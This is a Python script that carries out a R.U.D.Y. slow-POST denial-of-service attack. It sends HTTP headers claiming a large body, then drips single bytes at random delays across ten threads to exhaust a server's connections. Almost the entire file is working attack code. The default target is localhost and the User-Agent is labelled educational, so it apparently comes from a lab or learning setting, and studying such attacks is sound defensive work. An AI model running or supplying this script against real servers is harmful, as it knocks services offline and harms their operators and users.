import socket
import random
import time
import threading

# **************************************************************************************
# Function to perform a R.U.D.Y. (R-U-Dead-Yet) attack by sending large POST requests
# to a target IP address. This attack aims to exhaust server resources.
# **************************************************************************************
def rudy_attack(target_ip, target_port, target_path, total_duration):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    # Prepare the HTTP POST request headers
    headers = f"POST {target_path} HTTP/1.1\r\n"
    headers += "Host: {}\r\n".format(target_ip)
    headers += "User-Agent: rudy-educational-tool\r\n"
    headers += "Content-Length: 1000000\r\n"
    headers += "Content-Type: application/x-www-form-urlencoded\r\n"
    headers += "Connection: keep-alive\r\n\r\n"

    s.send(headers.encode())

    start_time = time.time()
    
    # Continuously send data chunks for the duration of the attack
    while time.time() - start_time < total_duration:
        chunk = "A"  # Data to send in each chunk
        s.send(chunk.encode())
       
        time.sleep(random.uniform(5, 15)) # Random delay between chunks
    
    
    s.close()
    
# **************************************************************************************
# Function to start a new thread for executing the R.U.D.Y. attack.
# **************************************************************************************
def start_attack_thread(target_ip, target_port, target_path, total_duration):
    thread = threading.Thread(target=rudy_attack, args=(target_ip, target_port, target_path, total_duration))
    print(f"Starting thread for target {target_ip}:{target_port}")
    thread.start()
    return thread

# **************************************************************************************
# Configuration for the R.U.D.Y. attack:
# Target IP address
# Target port
# Target path on the server
# Total duration of the attack in seconds (5 minutes)
# Number of threads to run the attack
# **************************************************************************************
target_ip = "127.0.0.1"
target_port = 3000
target_path = "/"
total_duration = 60 * 5  
num_threads = 10  

# **************************************************************************************
# Start multiple threads to execute the R.U.D.Y. attack.
# **************************************************************************************
threads = []
for _ in range(num_threads):
    thread = start_attack_thread(target_ip, target_port, target_path, total_duration)
    threads.append(thread)

# **************************************************************************************
# Wait for all attack threads to complete.
# **************************************************************************************
for thread in threads:
    thread.join()
